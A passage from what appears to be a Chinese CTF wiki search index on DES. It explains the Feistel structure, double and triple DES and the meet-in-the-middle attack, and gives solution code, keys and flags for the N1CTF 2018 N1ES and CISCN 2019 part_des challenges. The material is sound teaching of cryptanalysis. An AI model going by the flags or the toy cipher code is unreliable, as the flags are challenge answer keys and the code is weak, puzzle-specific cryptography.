0 , 0 , 1 , 0 , 1 , 1 , 0 , 1 , 1 , 0 , 0 , 1 , 1 , 1 , 0 , 1 , 1 , 0 , 1 , 1 , 1 , 1 , 1 , 0 , 0 , 0 , 0 , 0 , 1 , 0 , 0 , 0 , 0 , 0 , 1 , 0 , 0 , 1 , 0 , 1 , 0 , 1 ], [ 1 , 1 , 1 , 0 , 0 , 1 , 0 , 0 , 1 , 1 , 0 , 1 , 0 , 1 , 1 , 0 , 0 , 1 , 1 , 1 , 0 , 1 , 1 , 0 , 0 , 0 , 1 , 0 , 0 , 0 , 1 , 1 , 0 , 1 , 1 , 0 , 0 , 0 , 1 , 0 , 1 , 0 , 0 , 0 , 1 , 1 , 1 , 1 ], [ 1 , 1 , 1 , 0 , 0 , 1 , 1 , 0 , 1 , 1 , 0 , 1 , 0 , 0 , 1 , 1 , 0 , 1 , 1 , 1 , 0 , 1 , 1 , 0 , 0 , 0 , 1 , 1 , 0 , 1 , 1 , 0 , 0 , 0 , 1 , 1 , 0 , 0 , 0 , 1 , 1 , 0 , 0 , 0 , 0 , 0 , 1 , 1 ], [ 1 , 0 , 1 , 0 , 1 , 1 , 1 , 0 , 1 , 1 , 0 , 1 , 0 , 0 , 1 , 1 , 0 , 1 , 1 , 1 , 0 , 0 , 1 , 1 , 1 , 0 , 1 , 0 , 0 , 1 , 1 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 1 , 0 , 1 , 1 , 0 , 0 , 1 , 1 , 1 ], [ 1 , 0 , 1 , 0 , 1 , 1 , 1 , 1 , 0 , 1 , 0 , 1 , 0 , 0 , 1 , 1 , 0 , 1 , 1 , 1 , 1 , 0 , 1 , 1 , 0 , 1 , 0 , 0 , 0 , 1 , 1 , 0 , 1 , 0 , 1 , 0 , 1 , 0 , 1 , 1 , 1 , 1 , 0 , 0 , 0 , 0 , 1 , 0 ], [ 1 , 0 , 1 , 0 , 1 , 1 , 1 , 1 , 0 , 1 , 0 , 1 , 0 , 0 , 1 , 1 , 1 , 1 , 0 , 1 , 1 , 0 , 0 , 1 , 0 , 1 , 1 , 1 , 0 , 1 , 0 , 0 , 1 , 0 , 0 , 0 , 0 , 1 , 0 , 1 , 0 , 1 , 0 , 1 , 1 , 0 , 0 , 1 ], [ 0 , 0 , 0 , 1 , 1 , 1 , 1 , 1 , 0 , 1 , 0 , 1 , 1 , 0 , 1 , 1 , 1 , 1 , 0 , 1 , 1 , 0 , 0 , 1 , 0 , 1 , 0 , 0 , 1 , 0 , 1 , 1 , 1 , 0 , 0 , 1 , 0 , 1 , 0 , 0 , 0 , 1 , 0 , 0 , 1 , 0 , 1 , 0 ], [ 0 , 0 , 1 , 1 , 1 , 1 , 1 , 1 , 0 , 1 , 0 , 0 , 1 , 0 , 0 , 1 , 1 , 1 , 0 , 1 , 1 , 0 , 0 , 1 , 0 , 1 , 0 , 0 , 1 , 0 , 0 , 0 , 1 , 0 , 0 , 1 , 0 , 1 , 1 , 1 , 1 , 1 , 1 , 0 , 1 , 0 , 1 , 0 ], [ 0 , 0 , 0 , 1 , 1 , 1 , 1 , 1 , 0 , 1 , 1 , 0 , 1 , 0 , 0 , 1 , 1 , 0 , 0 , 1 , 1 , 1 , 0 , 1 , 0 , 0 , 0 , 1 , 1 , 1 , 0 , 0 , 1 , 1 , 0 , 1 , 1 , 1 , 0 , 0 , 0 , 0 , 1 , 0 , 1 , 0 , 0 , 1 ], [ 0 , 0 , 0 , 1 , 1 , 1 , 1 , 1 , 0 , 0 , 1 , 0 , 1 , 1 , 0 , 1 , 1 , 0 , 0 , 1 , 1 , 1 , 0 , 1 , 0 , 1 , 0 , 0 , 1 , 0 , 1 , 0 , 0 , 1 , 0 , 1 , 1 , 1 , 0 , 0 , 0 , 1 , 1 , 1 , 0 , 0 , 0 , 0 ], [ 0 , 1 , 0 , 1 , 1 , 1 , 1 , 1 , 0 , 0 , 1 , 0 , 1 , 1 , 0 , 0 , 1 , 0 , 1 , 0 , 1 , 1 , 0 , 1 , 1 , 0 , 0 , 0 , 1 , 0 , 0 , 1 , 1 , 1 , 1 , 0 , 1 , 0 , 0 , 1 , 0 , 0 , 1 , 1 , 1 , 0 , 0 , 0 ], [ 1 , 1 , 0 , 1 , 1 , 0 , 1 , 1 , 1 , 0 , 1 , 0 , 1 , 1 , 0 , 0 , 1 , 0 , 1 , 0 , 1 , 1 , 0 , 0 , 1 , 0 , 1 , 0 , 0 , 0 , 0 , 1 , 0 , 1 , 0 , 1 , 1 , 1 , 1 , 0 , 0 , 0 , 0 , 1 , 0 , 0 , 0 , 0 ], [ 1 , 1 , 0 , 1 , 1 , 0 , 0 , 0 , 1 , 0 , 1 , 0 , 1 , 1 , 1 , 0 , 1 , 0 , 1 , 0 , 1 , 1 , 1 , 0 , 1 , 1 , 0 , 1 , 1 , 0 , 0 , 1 , 0 , 0 , 0 , 0 , 0 , 0 , 1 , 0 , 0 , 0 , 1 , 1 , 0 , 1 , 1 , 0 ], [ 1 , 1 , 1 , 1 , 0 , 0 , 0 , 0 , 1 , 0 , 1 , 1 , 1 , 1 , 1 , 0 , 0 , 0 , 1 , 0 , 1 , 1 , 1 , 0 , 1 , 0 , 0 , 1 , 0 , 1 , 0 , 1 , 0 , 1 , 0 , 0 , 1 , 0 , 1 , 0 , 1 , 0 , 0 , 0 , 1 , 1 , 0 , 0 ], [ 1 , 1 , 1 , 1 , 0 , 0 , 0 , 0 , 1 , 0 , 1 , 1 , 1 , 1 , 1 , 0 , 1 , 0 , 1 , 0 , 0 , 1 , 1 , 0 , 0 , 0 , 0 , 1 , 0 , 0 , 0 , 1 , 0 , 0 , 1 , 0 , 1 , 1 , 1 , 0 , 1 , 0 , 0 , 0 , 0 , 1 , 0 , 0 ]], [[ 1 , 1 , 1 , 1 , 0 , 0 , 0 , 0 , 1 , 0 , 1 , 1 , 1 , 1 , 1 , 0 , 1 , 0 , 1 , 0 , 0 , 1 , 1 , 0 , 0 , 0 , 0 , 1 , 0 , 0 , 0 , 1 , 0 , 0 , 1 , 0 , 1 , 1 , 1 , 0 , 1 , 0 , 0 , 0 , 0 , 1 , 0 , 0 ], [ 1 , 1 , 1 , 1 , 0 , 0 , 0 , 0 , 1 , 0 , 1 , 1 , 1 , 1 , 1 , 0 , 0 , 0 , 1 , 0 , 1 , 1 , 1 , 0 , 1 , 0 , 0 , 1 , 0 , 1 , 0 , 1 , 0 , 1 , 0 , 0 , 1 , 0 , 1 , 0 , 1 , 0 , 0 , 0 , 1 , 1 , 0 , 0 ], [ 1 , 1 , 0 , 1 , 1 , 0 , 0 , 0 , 1 , 0 , 1 , 0 , 1 , 1 , 1 , 0 , 1 , 0 , 1 , 0 , 1 , 1 , 1 , 0 , 1 , 1 , 0 , 1 , 1 , 0 , 0 , 1 , 0 , 0 , 0 , 0 , 0 , 0 , 1 , 0 , 0 , 0 , 1 , 1 , 0 , 1 , 1 , 0 ], [ 1 , 1 , 0 , 1 , 1 , 0 , 1 , 1 , 1 , 0 , 1 , 0 , 1 , 1 , 0 , 0 , 1 , 0 , 1 , 0 , 1 , 1 , 0 , 0 , 1 , 0 , 1 , 0 , 0 , 0 , 0 , 1 , 0 , 1 , 0 , 1 , 1 , 1 , 1 , 0 , 0 , 0 , 0 , 1 , 0 , 0 , 0 , 0 ], [ 0 , 1 , 0 , 1 , 1 , 1 , 1 , 1 , 0 , 0 , 1 , 0 , 1 , 1 , 0 , 0 , 1 , 0 , 1 , 0 , 1 , 1 , 0 , 1 , 1 , 0 , 0 , 0 , 1 , 0 , 0 , 1 , 1 , 1 , 1 , 0 , 1 , 0 , 0 , 1 , 0 , 0 , 1 , 1 , 1 , 0 , 0 , 0 ], [ 0 , 0 , 0 , 1 , 1 , 1 , 1 , 1 , 0 , 0 , 1 , 0 , 1 , 1 , 0 , 1 , 1 , 0 , 0 , 1 , 1 , 1 , 0 , 1 , 0 , 1 , 0 , 0 , 1 , 0 , 1 , 0 , 0 , 1 , 0 , 1 , 1 , 1 , 0 , 0 , 0 , 1 , 1 , 1 , 0 , 0 , 0 , 0 ], [ 0 , 0 , 0 , 1 , 1 , 1 , 1 , 1 , 0 , 1 , 1 , 0 , 1 , 0 , 0 , 1 , 1 , 0 , 0 , 1 , 1 , 1 , 0 , 1 , 0 , 0 , 0 , 1 , 1 , 1 , 0 , 0 , 1 , 1 , 0 , 1 , 1 , 1 , 0 , 0 , 0 , 0 , 1 , 0 , 1 , 0 , 0 , 1 ], [ 0 , 0 , 1 , 1 , 1 , 1 , 1 , 1 , 0 , 1 , 0 , 0 , 1 , 0 , 0 , 1 , 1 , 1 , 0 , 1 , 1 , 0 , 0 , 1 , 0 , 1 , 0 , 0 , 1 , 0 , 0 , 0 , 1 , 0 , 0 , 1 , 0 , 1 , 1 , 1 , 1 , 1 , 1 , 0 , 1 , 0 , 1 , 0 ], [ 0 , 0 , 0 , 1 , 1 , 1 , 1 , 1 , 0 , 1 , 0 , 1 , 1 , 0 , 1 , 1 , 1 , 1 , 0 , 1 , 1 , 0 , 0 , 1 , 0 , 1 , 0 , 0 , 1 , 0 , 1 , 1 , 1 , 0 , 0 , 1 , 0 , 1 , 0 , 0 , 0 , 1 , 0 , 0 , 1 , 0 , 1 , 0 ], [ 1 , 0 , 1 , 0 , 1 , 1 , 1 , 1 , 0 , 1 , 0 , 1 , 0 , 0 , 1 , 1 , 1 , 1 , 0 , 1 , 1 , 0 , 0 , 1 , 0 , 1 , 1 , 1 , 0 , 1 , 0 , 0 , 1 , 0 , 0 , 0 , 0 , 1 , 0 , 1 , 0 , 1 , 0 , 1 , 1 , 0 , 0 , 1 ], [ 1 , 0 , 1 , 0 , 1 , 1 , 1 , 1 , 0 , 1 , 0 , 1 , 0 , 0 , 1 , 1 , 0 , 1 , 1 , 1 , 1 , 0 , 1 , 1 , 0 , 1 , 0 , 0 , 0 , 1 , 1 , 0 , 1 , 0 , 1 , 0 , 1 , 0 , 1 , 1 , 1 , 1 , 0 , 0 , 0 , 0 , 1 , 0 ], [ 1 , 0 , 1 , 0 , 1 , 1 , 1 , 0 , 1 , 1 , 0 , 1 , 0 , 0 , 1 , 1 , 0 , 1 , 1 , 1 , 0 , 0 , 1 , 1 , 1 , 0 , 1 , 0 , 0 , 1 , 1 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 1 , 0 , 1 , 1 , 0 , 0 , 1 , 1 , 1 ], [ 1 , 1 , 1 , 0 , 0 , 1 , 1 , 0 , 1 , 1 , 0 , 1 , 0 , 0 , 1 , 1 , 0 , 1 , 1 , 1 , 0 , 1 , 1 , 0 , 0 , 0 , 1 , 1 , 0 , 1 , 1 , 0 , 0 , 0 , 1 , 1 , 0 , 0 , 0 , 1 , 1 , 0 , 0 , 0 , 0 , 0 , 1 , 1 ], [ 1 , 1 , 1 , 0 , 0 , 1 , 0 , 0 , 1 , 1 , 0 , 1 , 0 , 1 , 1 , 0 , 0 , 1 , 1 , 1 , 0 , 1 , 1 , 0 , 0 , 0 , 1 , 0 , 0 , 0 , 1 , 1 , 0 , 1 , 1 , 0 , 0 , 0 , 1 , 0 , 1 , 0 , 0 , 0 , 1 , 1 , 1 , 1 ], [ 1 , 1 , 1 , 1 , 0 , 0 , 0 , 0 , 1 , 0 , 1 , 1 , 0 , 1 , 1 , 0 , 0 , 1 , 1 , 1 , 0 , 1 , 1 , 0 , 1 , 1 , 1 , 1 , 1 , 0 , 0 , 0 , 0 , 0 , 1 , 0 , 0 , 0 , 0 , 0 , 1 , 0 , 0 , 1 , 0 , 1 , 0 , 1 ], [ 1 , 1 , 1 , 0 , 0 , 0 , 0 , 0 , 1 , 0 , 1 , 1 , 1 , 1 , 1 , 0 , 0 , 1 , 1 , 0 , 0 , 1 , 1 , 0 , 0 , 0 , 0 , 1 , 0 , 0 , 0 , 0 , 0 , 0 , 1 , 1 , 0 , 0 , 1 , 0 , 1 , 1 , 0 , 1 , 0 , 1 , 0 , 1 ]]] def permute ( self , lst , tb ): return [ lst [ i - 1 ] for i in tb ] def f ( self , riti , subkeyi ): tmp = [ i ^ j for i , j in zip ( subkeyi , self . permute ( riti , DES . E ))] return self . permute ( sum ([[ int ( l ) for l in str ( bin ( DES . Sbox [ i ][ int ( str ( tmp [ 6 * i ]) + str ( tmp [ 6 * i + 5 ]), 2 )][ int ( \"\" . join ( str ( j ) for j in tmp [ 6 * i + 1 : 6 * i + 5 ]), 2 )])[ 2 :] . zfill ( 4 ))] for i in range ( 8 )],[]), DES . Pbox ) def des_main ( self , m , mark ): sbkey = self . subkey [ 0 ] #if mark == 'e' else self.subkey[1] # tmp = self.permute([int(i) for i in list((m).ljust(64,\"0\"))],self.IP) tmp = [ int ( i ) for i in list (( m ) . ljust ( 64 , \"0\" ))] global kkk print ( kkk ) for i in range ( kkk ): tmp = tmp [ 32 :] + [ j ^ k for j , k in zip ( tmp [: 32 ], self . f ( tmp [ 32 :], sbkey [ i if mark != 'd' else kkk - 1 - i ]))] return \"\" . join ([ str ( i ) for i in self . permute ( tmp [ 32 :] + tmp [: 32 ], self . IP_re )]) def des_encipher ( self , m ): m = \"\" . join ([ bin ( ord ( i ))[ 2 :] . zfill ( 8 ) for i in m ]) des_en = self . des_main ( m , 'e' ) return \"\" . join ([ chr ( int ( des_en [ i * 8 : i * 8 + 8 ], 2 )) for i in range ( 8 )]) def des_decipher ( self , c ): c = \"\" . join ([ bin ( ord ( i ))[ 2 :] . zfill ( 8 ) for i in c ]) des_de = self . des_main ( c , 'd' ) return \"\" . join ([ chr ( int ( des_de [ i * 8 : i * 8 + 8 ], 2 )) for i in range ( 8 )]) def test (): import base64 global kkk while kkk >= 0 : desobj = DES () # cipher = desobj.des_encipher(\"12345678\") cipher = ' \\x01\\x19\\xe1 + \\x92\\xd9\\x15 %' message1 = desobj . des_decipher ( cipher ) print ( message1 ) kkk -= 1 if __name__ == '__main__' : test () \u89e3\u5bc6\u7ed3\u679c\uff08\u90e8\u5206\uff09\uff1a 14 t-\u00cfE\u00cfx\u0090\u00a7 13 y0ur9Ood 12 \u00b5p^\u00db\u00e9=\u00b9\u0088 11 )\u00c1`r\u00fb\u00d5\u00fb\u009d \u53ef\u4ee5\u770b\u51fan\u4e3a13\uff0cflag\u4e3a flag{y0ur9Ood} \u53c2\u8003 \u00b6 \u6e05\u534e\u5927\u5b66\u7814\u7a76\u751f\u6570\u636e\u5b89\u5168\u8bfe\u7a0b\u8bfe\u4ef6 https://en.wikipedia.org/wiki/Data_Encryption_Standard","title":"DES"},{"location":"crypto/blockcipher/des/#des","text":"","title":"DES"},{"location":"crypto/blockcipher/des/#_1","text":"Data Encryption Standard(DES)\uff0c\u6570\u636e\u52a0\u5bc6\u6807\u51c6\uff0c\u662f\u5178\u578b\u7684\u5757\u52a0\u5bc6\uff0c\u5176\u57fa\u672c\u4fe1\u606f\u5982\u4e0b \u8f93\u5165 64 \u4f4d\u3002 \u8f93\u51fa 64 \u4f4d\u3002 \u5bc6\u94a5 64 \u4f4d\uff0c\u4f7f\u7528 64 \u4f4d\u5bc6\u94a5\u4e2d\u7684 56 \u4f4d\uff0c\u5269\u4f59\u7684 8 \u4f4d\u8981\u4e48\u4e22\u5f03\uff0c\u8981\u4e48\u4f5c\u4e3a\u5947\u5076\u6821\u9a8c\u4f4d\u3002 Feistel \u8fed\u4ee3\u7ed3\u6784 \u660e\u6587\u7ecf\u8fc7 16 \u8f6e\u8fed\u4ee3\u5f97\u5230\u5bc6\u6587\u3002 \u5bc6\u6587\u7ecf\u8fc7\u7c7b\u4f3c\u7684 16 \u8f6e\u8fed\u4ee3\u5f97\u5230\u660e\u6587\u3002","title":"\u57fa\u672c\u4ecb\u7ecd"},{"location":"crypto/blockcipher/des/#_2","text":"\u7ed9\u51fa\u4e00\u5f20\u7b80\u5355\u7684 DES \u6d41\u7a0b\u56fe \u3002","title":"\u57fa\u672c\u6d41\u7a0b"},{"location":"crypto/blockcipher/des/#_3","text":"\u6211\u4eec\u53ef\u4ee5\u8003\u8651\u4e00\u4e0b\u6bcf\u4e00\u8f6e\u7684\u52a0\u5bc6\u8fc7\u7a0b L_{i+1}=R_i L_{i+1}=R_i R_{i+1}=L_i\\oplus F(R_i,K_i) R_{i+1}=L_i\\oplus F(R_i,K_i) \u90a3\u4e48\u5728\u6700\u540e\u7684 Permutation \u4e4b\u524d\uff0c\u5bf9\u5e94\u7684\u5bc6\u6587\u4e3a (R_{n+1},L_{n+1}) (R_{n+1},L_{n+1}) \u3002","title":"\u52a0\u5bc6"},{"location":"crypto/blockcipher/des/#_4","text":"\u90a3\u4e48\u89e3\u5bc6\u5982\u4f55\u89e3\u5bc6\u5462\uff1f\u9996\u5148\u6211\u4eec\u53ef\u4ee5\u628a\u5bc6\u6587\u5148\u8fdb\u884c\u9006\u7f6e\u6362\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u5f97\u5230\u6700\u540e\u4e00\u8f6e\u7684\u8f93\u51fa\u3002\u6211\u4eec\u8fd9\u65f6\u8003\u8651\u6bcf\u4e00\u8f6e R_i=L_{i+1} R_i=L_{i+1} L_i=R_{i+1}\\oplus F(L_{i+1},K_i) L_i=R_{i+1}\\oplus F(L_{i+1},K_i) \u56e0\u6b64\uff0c (L_0,R_0) (L_0,R_0) \u5c31\u662f\u52a0\u5bc6\u65f6\u7b2c\u4e00\u6b21\u7f6e\u6362\u540e\u7684\u660e\u6587\u3002\u6211\u4eec\u53ea\u9700\u8981\u518d\u6267\u884c\u9006\u7f6e\u6362\u5c31\u53ef\u4ee5\u83b7\u5f97\u660e\u6587\u4e86\u3002 \u53ef\u4ee5\u770b\u51fa\uff0cDES \u52a0\u89e3\u5bc6\u4f7f\u7528\u540c\u4e00\u5957\u903b\u8f91\uff0c\u53ea\u662f\u5bc6\u94a5\u4f7f\u7528\u7684\u987a\u5e8f\u4e0d\u4e00\u81f4\u3002","title":"\u89e3\u5bc6"},{"location":"crypto/blockcipher/des/#_5","text":"DES \u4e2d\u7684\u6838\u5fc3\u90e8\u4ef6\u4e3b\u8981\u5305\u62ec\uff08\u8fd9\u91cc\u53ea\u7ed9\u51fa\u52a0\u5bc6\u8fc7\u7a0b\u7684\uff09 \u521d\u59cb\u7f6e\u6362 F \u51fd\u6570 E \u6269\u5c55\u51fd\u6570 S \u76d2\uff0c\u8bbe\u8ba1\u6807\u51c6\u672a\u7ed9\u51fa\u3002 P \u7f6e\u6362 \u6700\u540e\u7f6e\u6362 \u5176\u4e2d F \u51fd\u6570\u5982\u4e0b \u5982\u679c\u5bf9 DES \u66f4\u52a0\u611f\u5174\u8da3\uff0c\u53ef\u4ee5\u8fdb\u884c\u66f4\u52a0\u4ed4\u7ec6\u5730\u7814\u7a76\u3002\u6b22\u8fce\u63d0\u4f9b PR\u3002","title":"\u6838\u5fc3\u90e8\u4ef6"},{"location":"crypto/blockcipher/des/#_6","text":"\u5728 DES \u7684\u57fa\u7840\u4e0a\uff0c\u884d\u751f\u4e86\u4ee5\u4e0b\u4e24\u79cd\u52a0\u5bc6\u65b9\u5f0f \u53cc\u91cd DES \u4e09\u79cd DES","title":"\u884d\u751f"},{"location":"crypto/blockcipher/des/#des_1","text":"\u53cc\u91cd DES \u4f7f\u7528\u4e24\u4e2a\u5bc6\u94a5\uff0c\u957f\u5ea6\u4e3a 112 \u6bd4\u7279\u3002\u52a0\u5bc6\u65b9\u5f0f\u5982\u4e0b C=E_{k2}(E_{k1}(P)) C=E_{k2}(E_{k1}(P)) \u4f46\u662f\u53cc\u91cd DES \u4e0d\u80fd\u62b5\u6297\u4e2d\u95f4\u76f8\u9047\u653b\u51fb\uff0c\u6211\u4eec\u53ef\u4ee5\u6784\u9020\u5982\u4e0b\u4e24\u4e2a\u96c6\u5408 I={E_{k1}(P)} I={E_{k1}(P)} J=D_{k2}(C) J=D_{k2}(C) \u5373\u5206\u522b\u679a\u4e3e K1 \u548c K2 \u5206\u522b\u5bf9 P \u8fdb\u884c\u52a0\u5bc6\u548c\u5bf9 C \u8fdb\u884c\u89e3\u5bc6\u3002 \u5728\u6211\u4eec\u5bf9 P \u8fdb\u884c\u52a0\u5bc6\u5b8c\u6bd5\u540e\uff0c\u53ef\u4ee5\u5bf9\u52a0\u5bc6\u7ed3\u679c\u8fdb\u884c\u6392\u5e8f\uff0c\u8fd9\u6837\u7684\u590d\u6742\u5ea6\u4e3a 2^nlog(2^n)=O(n2^n) 2^nlog(2^n)=O(n2^n) \u5f53\u6211\u4eec\u5bf9 C \u8fdb\u884c\u89e3\u5bc6\u65f6\uff0c\u53ef\u4ee5\u6bcf\u89e3\u5bc6\u4e00\u4e2a\uff0c\u5c31\u53bb\u5bf9\u5e94\u7684\u8868\u4e2d\u67e5\u8be2\u3002 \u603b\u7684\u590d\u6742\u5ea6\u4e3a\u8fd8\u662f O(n2^n) O(n2^n) \u3002","title":"\u53cc\u91cd DES"},{"location":"crypto/blockcipher/des/#des_2","text":"\u4e09\u91cd DES \u7684\u52a0\u89e3\u5bc6\u65b9\u5f0f\u5982\u4e0b C=E_{k3}(D_{k2}(E_{k1}(P))) C=E_{k3}(D_{k2}(E_{k1}(P))) P=D_{k1}(E_{k2}(D_{k3}(C))) P=D_{k1}(E_{k2}(D_{k3}(C))) \u5728\u9009\u62e9\u5bc6\u94a5\u65f6\uff0c\u53ef\u4ee5\u6709\u4e24\u79cd\u65b9\u6cd5 3 \u4e2a\u4e0d\u540c\u7684\u5bc6\u94a5\uff0ck1\uff0ck2\uff0ck3 \u4e92\u76f8\u72ec\u7acb\uff0c\u4e00\u5171 168 \u6bd4\u7279\u3002 2 \u4e2a\u4e0d\u540c\u7684\u5bc6\u94a5\uff0ck1 \u4e0e k2 \u72ec\u7acb\uff0ck3=k1\uff0c112 \u6bd4\u7279\u3002","title":"\u4e09\u91cd DES"},{"location":"crypto/blockcipher/des/#_7","text":"\u5dee\u5206\u653b\u51fb \u7ebf\u6027\u653b\u51fb","title":"\u653b\u51fb\u65b9\u6cd5"},{"location":"crypto/blockcipher/des/#2018-n1ctf-n1es","text":"\u57fa\u672c\u4ee3\u7801\u5982\u4e0b # -*- coding: utf-8 -*- def round_add ( a , b ): f = lambda x , y : x + y - 2 * ( x & y ) res = '' for i in range ( len ( a )): res += chr ( f ( ord ( a [ i ]), ord ( b [ i ]))) return res def permutate ( table , block ): return list ( map ( lambda x : block [ x ], table )) def string_to_bits ( data ): data = [ ord ( c ) for c in data ] l = len ( data ) * 8 result = [ 0 ] * l pos = 0 for ch in data : for i in range ( 0 , 8 ): result [( pos << 3 ) + i ] = ( ch >> i ) & 1 pos += 1 return result s_box = [ 54 , 132 , 138 , 83 , 16 , 73 , 187 , 84 , 146 , 30 , 95 , 21 , 148 , 63 , 65 , 189 , 188 , 151 , 72 , 161 , 116 , 63 , 161 , 91 , 37 , 24 , 126 , 107 , 87 , 30 , 117 , 185 , 98 , 90 , 0 , 42 , 140 , 70 , 86 , 0 , 42 , 150 , 54 , 22 , 144 , 153 , 36 , 90 , 149 , 54 , 156 , 8 , 59 , 40 , 110 , 56 , 1 , 84 , 103 , 22 , 65 , 17 , 190 , 41 , 99 , 151 , 119 , 124 , 68 , 17 , 166 , 125 , 95 , 65 , 105 , 133 , 49 , 19 , 138 , 29 , 110 , 7 , 81 , 134 , 70 , 87 , 180 , 78 , 175 , 108 , 26 , 121 , 74 , 29 , 68 , 162 , 142 , 177 , 143 , 86 , 129 , 101 , 117 , 41 , 57 , 34 , 177 , 103 , 61 , 135 , 191 , 74 , 69 , 147 , 90 , 49 , 135 , 124 , 106 , 19 , 8 9 , 38 , 21 , 41 , 17 , 155 , 83 , 38 , 159 , 179 , 19 , 157 , 68 , 105 , 151 , 166 , 171 , 122 , 179 , 114 , 52 , 183 , 89 , 107 , 113 , 65 , 161 , 141 , 18 , 121 , 95 , 4 , 95 , 101 , 81 , 156 , 17 , 190 , 38 , 84 , 9 , 171 , 180 , 59 , 45 , 15 , 34 , 89 , 75 , 164 , 190 , 140 , 6 , 41 , 188 , 77 , 165 , 105 , 5 , 107 , 31 , 183 , 107 , 141 , 66 , 63 , 10 , 9 , 125 , 50 , 2 , 153 , 156 , 162 , 186 , 76 , 158 , 153 , 117 , 9 , 77 , 156 , 11 , 145 , 12 , 169 , 52 , 57 , 161 , 7 , 158 , 110 , 191 , 43 , 82 , 186 , 49 , 102 , 166 , 31 , 41 , 5 , 189 , 27 ] def generate ( o ): k = permutate ( s_box , o ) b = [] for i in range ( 0 , len ( k ), 7 ): b . append ( k [ i : i + 7 ] + [ 1 ]) c = [] for i in range ( 32 ): pos = 0 x = 0 for j in b [ i ]: x += ( j << pos ) pos += 1 c . append (( 0x10001 ** x ) % ( 0x7f )) return c class N1ES : def __init__ ( self , key ): if ( len ( key ) != 24 or isinstance ( key , bytes ) == False ): raise Exception ( \"key must be 24 bytes long\" ) self . key = key self . gen_subkey () def gen_subkey ( self ): o = string_to_bits ( self . key ) k = [] for i in range ( 8 ): o = generate ( o ) k . extend ( o ) o = string_to_bits ([ chr ( c ) for c in o [ 0 : 24 ]]) self . Kn = [] for i in range ( 32 ): self . Kn . append ( map ( chr , k [ i * 8 : i * 8 + 8 ])) return def encrypt ( self , plaintext ): if ( len ( plaintext ) % 16 != 0 or isinstance ( plaintext , bytes ) == False ): raise Exception ( \"plaintext must be a multiple of 16 in length\" ) res = '' for i in range ( len ( plaintext ) / 16 ): block = plaintext [ i * 16 :( i + 1 ) * 16 ] L = block [: 8 ] R = block [ 8 :] for round_cnt in range ( 32 ): L , R = R , ( round_add ( L , self . Kn [ round_cnt ])) L , R = R , L res += L + R return res \u663e\u7136\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06\u5176\u89c6\u4e3a\u4e00\u4e2a Feistel \u52a0\u5bc6\u7684\u65b9\u5f0f\uff0c\u89e3\u5bc6\u51fd\u6570\u5982\u4e0b def decrypt ( self , ciphertext ): res = '' for i in range ( len ( ciphertext ) / 16 ): block = ciphertext [ i * 16 :( i + 1 ) * 16 ] L = block [: 8 ] R = block [ 8 :] for round_cnt in range ( 32 ): L , R = R , ( round_add ( L , self . Kn [ 31 - round_cnt ])) L , R = R , L res += L + R return res \u6700\u540e\u7ed3\u679c\u4e3a \u279c baby_N1ES cat challenge.py from N1ES import N1ES import base64 key = \"wxy191iss00000000000cute\" n1es = N1ES ( key ) flag = \"N1CTF{*****************************************}\" cipher = n1es.encrypt ( flag ) #print base64.b64encode(cipher) # HRlgC2ReHW1/WRk2DikfNBo1dl1XZBJrRR9qECMNOjNHDktBJSxcI1hZIz07YjVx cipher = 'HRlgC2ReHW1/WRk2DikfNBo1dl1XZBJrRR9qECMNOjNHDktBJSxcI1hZIz07YjVx' cipher = base64.b64decode ( cipher ) print n1es.decrypt ( cipher ) \u279c baby_N1ES python challenge.py N1CTF { F3istel_n3tw0rk_c4n_b3_ea5i1y_s0lv3d_/--/ }","title":"2018 N1CTF N1ES"},{"location":"crypto/blockcipher/des/#2019-ciscn-part_des","text":"\u9898\u76ee\u53ea\u7ed9\u4e86\u4e00\u4e2a\u6587\u4ef6\uff1a Round n part_encode-> 0x92d915250119e12b Key map -> 0xe0be661032d5f0b676f82095e4d67623628fe6d376363183aed373a60167af537b46abc2af53d97485591f5bd94b944a3f49d94897ea1f699d1cdc291f2d9d4a5c705f2cad89e938dbacaca15e10d8aeaed90236f0be2e954a8cf0bea6112e84 \u8003\u8651\u5230\u9898\u76ee\u540d\u4ee5\u53ca\u6570\u636e\u7279\u5f81\uff0c Round n part_encode \u4e3a\u6267\u884cn\u8f6edes\u7684\u4e2d\u95f4\u7ed3\u679c\uff0c Key map \u5e94\u4e3ades\u7684\u5b50\u5bc6\u94a5\uff0c\u8981\u8fd8\u539f\u51fa\u660e\u6587\u53ea\u9700\u8fdb\u884cn\u8f6edes\u52a0\u5bc6\u7684\u9006\u8fc7\u7a0b\u5373\u53ef\uff0c\u89e3\u5bc6\u65f6\u6ce8\u610f\u4ee5\u4e0b\u4e09\u70b9\u3002 \u5b50\u5bc6\u94a5\u7684\u9009\u53d6\uff0c\u5bf9\u4e8e\u53ea\u8fdb\u884c\u4e86n\u8f6e\u7684\u52a0\u5bc6\u7ed3\u679c\uff0c\u89e3\u5bc6\u65f6\u5e94\u4f9d\u6b21\u4f7f\u7528\u5bc6\u94a5 n, n-1..., 1\u3002 des \u6700\u540e\u4e00\u8f6e\u540e\u7684\u64cd\u4f5c\uff0c\u672a\u5b8c\u6210\u7684 des \u6ca1\u6709\u4ea4\u6362\u5de6\u53f3\u4e24\u90e8\u5206\u548c\u9006\u521d\u59cb\u7f6e\u6362\uff0c\u56e0\u6b64\u89e3\u5bc6\u65f6\u6211\u4eec\u5e94\u5148\u5bf9\u5bc6\u6587\u8fdb\u884c\u8fd9\u4e24\u6b65\u64cd\u4f5c\u3002 n \u7684\u9009\u62e9\uff0c\u5728\u672c\u9898\u4e2d\uff0c\u6211\u4eec\u5e76\u4e0d\u77e5\u9053 n\uff0c\u4f46\u8fd9\u65e0\u5173\u7d27\u8981\uff0c\u6211\u4eec\u53ef\u4ee5\u5c1d\u8bd5\u6240\u6709\u53ef\u80fd\u7684\u53d6\u503c\uff080-15\uff09flag\u5e94\u4e3aascii\u5b57\u7b26\u4e32\u3002 \u89e3\u9898\u4ee3\u7801 kkk = 16 def bit_rot_left ( lst , pos ): return lst [ pos :] + lst [: pos ] class DES : IP = [ 58 , 50 , 42 , 34 , 26 , 18 , 10 , 2 , 60 , 52 , 44 , 36 , 28 , 20 , 12 , 4 , 62 , 54 , 46 , 38 , 30 , 22 , 14 , 6 , 64 , 56 , 48 , 40 , 32 , 24 , 16 , 8 , 57 , 49 , 41 , 33 , 25 , 17 , 9 , 1 , 59 , 51 , 43 , 35 , 27 , 19 , 11 , 3 